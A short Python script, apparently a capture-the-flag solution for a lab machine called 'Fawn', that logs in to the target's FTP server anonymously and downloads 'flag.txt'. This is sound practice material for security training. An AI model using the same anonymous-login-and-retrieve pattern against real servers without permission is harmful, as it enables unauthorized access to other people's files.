import ftplib # Imports
import sys
import info
import os
 
def getFile(ftp, filename): # Function so we can get the file
    try:
        ftp.retrbinary("RETR " + filename ,open(filename, 'wb').write)
    except:
        print("Error")


fawn = input("Enter Your Fawn IP: ") # Enter the Fawn IP 
ftp = ftplib.FTP(fawn) # Declares the FTP server to login to
ftp.login() # Logs into the FTP Server



getFile(ftp,'flag.txt') # Downloads the flag file
print(info.headermessage, info.fawnmessage) # Prints the "GeckScript message"

print("Flag Retrieved Check Your Current Directory For The File") # Informs user that the flag has been retrieved 
ftp.quit() # Closes the FTP session
#os.system("echo flag is: && cat flag.txt") # Only Uncomment if Linux
# Dr-Gecko 2022